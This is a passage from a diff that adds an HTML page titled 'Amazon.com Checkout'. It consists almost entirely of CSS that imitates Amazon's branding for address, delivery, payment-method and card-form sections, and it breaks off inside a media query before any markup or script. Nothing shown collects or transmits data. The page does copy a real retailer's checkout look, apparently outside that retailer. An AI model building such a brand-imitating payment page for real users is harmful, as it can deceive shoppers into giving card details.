@@ -1,0 +1,2984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Amazon.com Checkout</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ===== MODERN AMAZON 2024 STYLES ===== */
+        :root {
+            --amazon-orange: #ff9900;
+            --amazon-dark: #131921;
+            --amazon-blue: #146eb4;
+            --amazon-light: #f0f2f2;
+            --amazon-border: #d5d9d9;
+            --amazon-text: #0f1111;
+            --amazon-price: #b12704;
+            --amazon-success: #007600;
+            --amazon-yellow: #f0c14b;
+            --amazon-yellow-dark: #e7ac2d;
+            --amazon-gray: #565959;
+            --amazon-blue-link: #0066c0;
+            --amazon-hover-orange: #e67a00;
+            --amazon-light-gray: #f5f5f5;
+            --amazon-medium-gray: #e0e0e0;
+            --amazon-card-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            --amazon-card-hover: 0 4px 12px rgba(0, 0, 0, 0.12);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Amazon Ember", Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: var(--amazon-text);
+            line-height: 20px;
+            font-size: 14px;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* ===== MODERN AMAZON HEADER ===== */
+        .amazon-header {
+            background-color: var(--amazon-dark);
+            height: 60px;
+            width: 100%;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-wrapper {
+            max-width: 1600px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        /* Modern Amazon Logo */
+        .amazon-logo-container {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+        }
+
+        .amazon-logo {
+            display: inline-block;
+            height: 32px;
+            width: 112px;
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border-radius: 3px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s;
+        }
+
+        .amazon-logo:hover {
+            transform: scale(1.02);
+        }
+
+        .amazon-logo::before {
+            content: "amazon";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 20px;
+            font-weight: bold;
+            color: #111;
+            letter-spacing: -0.5px;
+            white-space: nowrap;
+        }
+
+        .checkout-text {
+            color: white;
+            font-size: 24px;
+            font-weight: 400;
+            letter-spacing: -0.5px;
+            font-weight: 500;
+        }
+
+        /* Modern Secure Notice */
+        .secure-notice {
+            display: flex;
+            align-items: center;
+            color: white;
+            font-size: 14px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .secure-notice i {
+            color: #00d100;
+            margin-right: 8px;
+            font-size: 16px;
+        }
+
+        /* ===== MODERN CHECKOUT PROGRESS ===== */
+        .checkout-progress {
+            background-color: white;
+            border-bottom: 1px solid #e7e7e7;
+            padding: 18px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
+        }
+
+        .progress-wrapper {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .progress-steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 35px;
+            flex-wrap: wrap;
+        }
+
+        .progress-step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--amazon-text);
+            font-size: 14px;
+            white-space: nowrap;
+            position: relative;
+            padding: 8px 16px;
+            border-radius: 6px;
+            transition: background-color 0.2s;
+        }
+
+        .progress-step:hover {
+            background-color: var(--amazon-light);
+        }
+
+        .step-number {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .step-number.completed {
+            background-color: var(--amazon-success);
+            color: white;
+            box-shadow: 0 2px 4px rgba(0, 118, 0, 0.2);
+        }
+
+        .step-number.active {
+            background-color: var(--amazon-orange);
+            color: white;
+            box-shadow: 0 2px 6px rgba(255, 153, 0, 0.3);
+        }
+
+        /* ===== MODERN MAIN CHECKOUT LAYOUT ===== */
+        .checkout-container {
+            max-width: 1600px;
+            margin: 30px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 2.5fr 1.5fr;
+            gap: 30px;
+        }
+
+        /* ===== MODERN LEFT COLUMN - FORMS ===== */
+        .left-column {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        /* Modern Checkout Box */
+        .checkout-box {
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            background: white;
+            overflow: hidden;
+            transition: box-shadow 0.3s, transform 0.2s;
+            box-shadow: var(--amazon-card-shadow);
+        }
+
+        .checkout-box:hover {
+            box-shadow: var(--amazon-card-hover);
+            transform: translateY(-1px);
+        }
+
+        .box-header {
+            padding: 22px 24px;
+            border-bottom: 1px solid #f0f0f0;
+            background-color: #fafafa;
+            position: relative;
+        }
+
+        .box-header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #e0e0e0, transparent);
+        }
+
+        .box-header h2 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #111;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .box-header a {
+            color: var(--amazon-blue-link);
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .box-header a:hover {
+            color: var(--amazon-hover-orange);
+            background-color: #f7f7f7;
+            text-decoration: none;
+        }
+
+        .box-content {
+            padding: 24px;
+        }
+
+        /* Modern Shipping Address Styles */
+        .address-container {
+            padding: 0;
+        }
+
+        .address-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .address-option {
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 18px;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            background: white;
+        }
+
+        .address-option:hover {
+            border-color: var(--amazon-medium-gray);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .address-option.selected {
+            border-color: var(--amazon-orange);
+            background: linear-gradient(135deg, #fffaf0, #fff5e6);
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.1), 0 4px 12px rgba(255, 153, 0, 0.15);
+        }
+
+        .address-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .address-name {
+            font-weight: 700;
+            font-size: 15px;
+            color: #111;
+        }
+
+        .address-type {
+            background: linear-gradient(135deg, #e6f2ff, #d4e8ff);
+            color: var(--amazon-blue);
+            font-size: 12px;
+            padding: 4px 8px;
+            border-radius: 6px;
+            margin-left: 8px;
+            font-weight: 600;
+        }
+
+        .address-details {
+            font-size: 14px;
+            line-height: 22px;
+            color: #555;
+        }
+
+        .address-phone {
+            margin-top: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        .address-actions {
+            display: flex;
+            gap: 16px;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .address-action-link {
+            color: var(--amazon-blue-link);
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: all 0.2s;
+            font-weight: 500;
+        }
+
+        .address-action-link:hover {
+            color: var(--amazon-hover-orange);
+            background-color: #f7f7f7;
+            text-decoration: none;
+        }
+
+        /* Modern No Address Message */
+        .no-address-message {
+            text-align: center;
+            padding: 48px 24px;
+            color: #666;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+            border-radius: 12px;
+            margin: 16px 0;
+        }
+
+        .no-address-message i {
+            font-size: 48px;
+            color: #e0e0e0;
+            margin-bottom: 20px;
+            opacity: 0.8;
+        }
+
+        .no-address-message p {
+            font-size: 15px;
+            margin-bottom: 16px;
+            line-height: 24px;
+        }
+
+        .no-address-message p:first-of-type {
+            font-size: 18px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        /* Modern Add New Address Button */
+        .add-address-btn {
+            width: 100%;
+            background: linear-gradient(to bottom, #ffffff, #fafafa);
+            border: 2px solid #d5d9d9;
+            border-radius: 10px;
+            color: #111;
+            padding: 14px 16px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .add-address-btn:hover {
+            background: linear-gradient(to bottom, #fafafa, #f5f5f5);
+            border-color: #a2a6ac;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .add-address-btn:active {
+            transform: translateY(0);
+        }
+
+        .add-address-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .add-address-btn i {
+            font-size: 16px;
+            transition: transform 0.3s;
+        }
+
+        .add-address-btn:hover i {
+            transform: scale(1.1);
+        }
+
+        .add-address-btn.loading i {
+            animation: spin 1s linear infinite;
+        }
+
+        /* Modern Payment Loading */
+        .payment-loading {
+            display: none;
+            text-align: center;
+            padding: 32px;
+            border: 2px dashed #e0e0e0;
+            border-radius: 12px;
+            margin-top: 20px;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+        }
+
+        .payment-loading i {
+            font-size: 32px;
+            color: var(--amazon-orange);
+            margin-bottom: 16px;
+            animation: pulse 1.5s infinite;
+        }
+
+        .payment-loading p {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Modern PayPal/Amazon Pay Redirect */
+        .paypal-redirect, .amazonpay-redirect {
+            display: none;
+            text-align: center;
+            padding: 32px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            margin-top: 20px;
+            background: white;
+        }
+
+        .paypal-redirect i, .amazonpay-redirect i {
+            font-size: 56px;
+            margin-bottom: 20px;
+            transition: transform 0.3s;
+        }
+
+        .paypal-redirect:hover i, .amazonpay-redirect:hover i {
+            transform: scale(1.05);
+        }
+
+        .paypal-redirect i {
+            color: #003087;
+        }
+
+        .amazonpay-redirect i {
+            color: var(--amazon-orange);
+        }
+
+        .paypal-redirect h3, .amazonpay-redirect h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #111;
+        }
+
+        .paypal-redirect p, .amazonpay-redirect p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+            line-height: 22px;
+        }
+
+        /* Modern Delivery Options */
+        .delivery-options {
+            margin-top: 20px;
+            border-top: 1px solid #f0f0f0;
+            padding-top: 24px;
+        }
+
+        .delivery-option {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            margin-bottom: 20px;
+            padding: 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        .delivery-option:hover {
+            border-color: var(--amazon-medium-gray);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .delivery-option.selected {
+            border-color: var(--amazon-orange);
+            background: linear-gradient(135deg, #fffaf0, #fff5e6);
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.1), 0 4px 12px rgba(255, 153, 0, 0.15);
+        }
+
+        .delivery-option input[type="radio"] {
+            margin-top: 4px;
+            accent-color: var(--amazon-orange);
+            transform: scale(1.2);
+        }
+
+        .delivery-details {
+            flex: 1;
+        }
+
+        .delivery-title {
+            font-weight: 700;
+            font-size: 15px;
+            color: #111;
+            margin-bottom: 6px;
+        }
+
+        .delivery-date {
+            color: var(--amazon-success);
+            font-size: 14px;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .delivery-price {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        /* Modern Payment Methods */
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .payment-option {
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        .payment-option:hover {
+            border-color: var(--amazon-medium-gray);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .payment-option.selected {
+            border-color: var(--amazon-orange);
+            background: linear-gradient(135deg, #fffaf0, #fff5e6);
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.1), 0 4px 12px rgba(255, 153, 0, 0.15);
+        }
+
+        .payment-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 8px;
+        }
+
+        .payment-icon {
+            font-size: 28px;
+            color: #666;
+            transition: transform 0.3s;
+        }
+
+        .payment-option:hover .payment-icon {
+            transform: scale(1.1);
+        }
+
+        .payment-icon.visa { color: #1a1f71; }
+        .payment-icon.mastercard { color: #eb001b; }
+        .payment-icon.amex { color: #2e77bc; }
+
+        .payment-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #111;
+        }
+
+        .payment-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-left: 42px;
+        }
+
+        /* Modern Card Form */
+        .card-form {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
+            animation: fadeIn 0.5s ease;
+        }
+
+        /* Modern Address Form Modal */
+        .address-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .address-modal-content {
+            background: white;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 640px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalSlideIn 0.4s ease;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .address-modal-header {
+            background: linear-gradient(135deg, #232f3e, #131921);
+            color: white;
+            padding: 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+
+        .address-modal-header h2 {
+            font-weight: 500;
+            font-size: 22px;
+            letter-spacing: -0.3px;
+        }
+
+        .close-address-modal {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+            border-radius: 50%;
+            transition: all 0.2s;
+        }
+
+        .close-address-modal:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(90deg);
+        }
+
+        .address-modal-body {
+            padding: 32px;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+        }
+
+        .address-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .form-group {
+            margin-bottom: 8px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            letter-spacing: -0.2px;
+        }
+
+        .form-label.required:after {
+            content: " *";
+            color: #cc0c39;
+        }
+
+        /* Modern Amazon Input */
+        .amazon-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #d5d9d9;
+            border-radius: 8px;
+            font-size: 14px;
+            line-height: 20px;
+            background: white;
+            transition: all 0.3s;
+            color: #111;
+            font-weight: 400;
+        }
+
+        .amazon-input:hover {
+            border-color: #a2a6ac;
+        }
+
+        .amazon-input:focus {
+            outline: none;
+            border-color: var(--amazon-orange);
+            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.2);
+            background: white;
+        }
+
+        .amazon-input::placeholder {
+            color: #999;
+            font-weight: 400;
+        }
+
+        .input-hint {
+            display: block;
+            margin-top: 6px;
+            font-size: 13px;
+            color: #666;
+            line-height: 18px;
+        }
+
+        /* Modern Checkbox */
+        .form-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 8px;
+            padding: 8px;
+            border-radius: 6px;
+            transition: background-color 0.2s;
+        }
+
+        .form-checkbox:hover {
+            background-color: rgba(0, 0, 0, 0.02);
+        }
+
+        .form-checkbox input {
+            margin: 0;
+            width: 18px;
+            height: 18px;
+            accent-color: var(--amazon-orange);
+        }
+
+        .form-checkbox label {
+            font-size: 14px;
+            color: #555;
+            line-height: 20px;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        .address-form-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 16px;
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        /* Modern Amazon Buttons */
+        .amazon-btn {
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 2px solid;
+            min-width: 120px;
+            text-align: center;
+            transition: all 0.3s;
+            letter-spacing: -0.2px;
+        }
+
+        .amazon-btn-secondary {
+            background: white;
+            border-color: #d5d9d9;
+            color: #111;
+        }
+
+        .amazon-btn-secondary:hover {
+            background: #f5f5f5;
+            border-color: #a2a6ac;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .amazon-btn-primary {
+            background: linear-gradient(to bottom, #ffd86e, #ffc73b);
+            border-color: #a88734 #9c7e31 #846a29;
+            color: #111;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .amazon-btn-primary::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(to bottom, rgba(255, 255, 255, 0.2), rgba(255, 255, 255, 0));
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .amazon-btn-primary:hover {
+            background: linear-gradient(to bottom, #f7d15d, #ffbd1f);
+            border-color: #967836 #8a6d31 #735925;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(255, 153, 0, 0.25);
+        }
+
+        .amazon-btn-primary:hover::after {
+            opacity: 1;
+        }
+
+        .amazon-btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border-color: #a2a6ac;
+            color: #666;
+            box-shadow: none;
+        }
+
+        /* ===== MODERN RIGHT COLUMN - ORDER SUMMARY ===== */
+        .right-column {
+            position: relative;
+        }
+
+        .order-summary {
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            background: white;
+            position: sticky;
+            top: 100px;
+            overflow: hidden;
+            box-shadow: var(--amazon-card-shadow);
+            transition: box-shadow 0.3s;
+        }
+
+        .order-summary:hover {
+            box-shadow: var(--amazon-card-hover);
+        }
+
+        .summary-header {
+            padding: 24px;
+            border-bottom: 1px solid #f0f0f0;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+        }
+
+        .summary-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #111;
+            letter-spacing: -0.3px;
+        }
+
+        .summary-content {
+            padding: 24px;
+        }
+
+        /* Modern Order Items */
+        .order-item {
+            display: flex;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #f0f0f0;
+            gap: 16px;
+        }
+
+        .order-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .item-image {
+            width: 100px;
+            height: 100px;
+            flex-shrink: 0;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #f5f5f5;
+            border: 1px solid #f0f0f0;
+        }
+
+        .item-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            transition: transform 0.3s;
+        }
+
+        .order-item:hover .item-image img {
+            transform: scale(1.05);
+        }
+
+        .item-details {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .item-title {
+            font-size: 14px;
+            line-height: 22px;
+            margin-bottom: 8px;
+            color: #111;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            font-weight: 500;
+        }
+
+        .item-price {
+            color: var(--amazon-price);
+            font-weight: 700;
+            font-size: 18px;
+            line-height: 24px;
+            margin-bottom: 4px;
+        }
+
+        .item-shipping {
+            font-size: 13px;
+            color: var(--amazon-success);
+            margin-top: 4px;
+            font-weight: 600;
+        }
+
+        .item-quantity {
+            font-size: 13px;
+            color: #666;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+
+        /* Modern Order Totals */
+        .order-totals {
+            margin: 24px 0;
+            padding: 24px;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+            border-radius: 12px;
+        }
+
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 14px;
+            font-size: 14px;
+            line-height: 20px;
+            color: #555;
+        }
+
+        .total-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .total-row.total {
+            border-top: 2px solid #e0e0e0;
+            padding-top: 20px;
+            margin-top: 20px;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--amazon-price);
+        }
+
+        /* Modern Place Order Button */
+        .place-order-section {
+            padding: 24px;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .place-order-btn {
+            width: 100%;
+            background: linear-gradient(to bottom, #ffd86e, #ffc73b);
+            border: 2px solid #a88734;
+            border-radius: 10px;
+            color: #111;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: -0.3px;
+        }
+
+        .place-order-btn:hover {
+            background: linear-gradient(to bottom, #f7d15d, #ffbd1f);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 153, 0, 0.3);
+        }
+
+        .place-order-btn:active {
+            transform: translateY(0);
+        }
+
+        .place-order-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+            border-color: #a2a6ac;
+            color: #666;
+            box-shadow: none;
+        }
+
+        /* Place Order Button Requirements Message */
+        .place-order-requirements {
+            background: linear-gradient(135deg, #fff8f0, #fff5e6);
+            border: 2px solid #ff9900;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .place-order-requirements i {
+            color: #ff9900;
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+
+        .requirements-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .requirements-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            text-align: left;
+            display: inline-block;
+        }
+
+        .requirements-list li {
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .requirements-list li i {
+            font-size: 12px;
+            margin: 0;
+        }
+
+        .requirements-list li.requirement-met i {
+            color: var(--amazon-success);
+        }
+
+        .requirements-list li.requirement-not-met i {
+            color: #999;
+        }
+
+        .order-note {
+            font-size: 13px;
+            color: #666;
+            margin-top: 16px;
+            text-align: center;
+            line-height: 18px;
+            font-weight: 500;
+        }
+
+        .order-note i {
+            color: var(--amazon-success);
+            margin-right: 8px;
+            font-size: 14px;
+        }
+
+        .terms-notice {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+            text-align: center;
+            line-height: 20px;
+        }
+
+        .terms-notice a {
+            color: var(--amazon-blue-link);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .terms-notice a:hover {
+            color: var(--amazon-hover-orange);
+            text-decoration: underline;
+        }
+
+        /* ===== MODERN FOOTER ===== */
+        .amazon-footer {
+            background: linear-gradient(135deg, #131a22, #0d1117);
+            color: #ddd;
+            margin-top: 60px;
+            padding-top: 50px;
+            border-top: 1px solid #3a4553;
+        }
+
+        .footer-content {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
+            padding-bottom: 40px;
+            border-bottom: 1px solid #3a4553;
+        }
+
+        .footer-link {
+            color: #ddd;
+            text-decoration: none;
+            font-size: 14px;
+            line-height: 18px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s;
+            font-weight: 500;
+        }
+
+        .footer-link:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: none;
+        }
+
+        .copyright {
+            text-align: center;
+            padding: 32px 20px;
+            font-size: 13px;
+            color: #aaa;
+            line-height: 18px;
+        }
+
+        /* ===== MODERN MODAL ===== */
+        .amazon-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 560px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalSlideIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #232f3e, #131921);
+            color: white;
+            padding: 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h2 {
+            font-weight: 500;
+            font-size: 24px;
+            letter-spacing: -0.3px;
+        }
+
+        .close-modal {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+            border-radius: 50%;
+            transition: all 0.2s;
+        }
+
+        .close-modal:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            padding: 40px;
+            text-align: center;
+            background: linear-gradient(135deg, #fafafa, #f5f5f5);
+        }
+
+        .modal-body i {
+            font-size: 72px;
+            color: var(--amazon-success);
+            margin-bottom: 28px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .modal-body h3 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--amazon-success);
+            letter-spacing: -0.5px;
+        }
+
+        .modal-body p {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 12px;
+            line-height: 24px;
+        }
+
+        /* ===== MODERN VALIDATION STYLES ===== */
+        .validation-message {
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+            line-height: 18px;
+            font-weight: 500;
+        }
+
+        .validation-success {
+            color: var(--amazon-success);
+        }
+
+        .validation-error {
+            color: #cc0c39;
+        }
+
+        .input-valid {
+            border-color: var(--amazon-success) !important;
+            background: linear-gradient(135deg, #f8fff8, #f0fff0) !important;
+        }
+
+        .input-invalid {
+            border-color: #cc0c39 !important;
+            background: linear-gradient(135deg, #fff8f8, #fff0f0) !important;
+            box-shadow: 0 0 0 3px rgba(204, 12, 57, 0.1) !important;
+        }
+
+        /* ===== MODERN LOADING SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 153, 0, 0.2);
+            border-radius: 50%;
+            border-top-color: var(--amazon-orange);
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* ===== RESPONSIVE DESIGN ===== */
+        @media (max-width: 1200px) {
+            .checkout-container {
+                grid-template-columns: 2fr 1fr;
+                gap: 24px;
+            }
+            
+            .address-list {
+                grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            }
+        }
+
+        @media (max-width: 992px) {
+            .checkout-container {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+            
+            .right-column {
+                order: -1;
+            }
+            
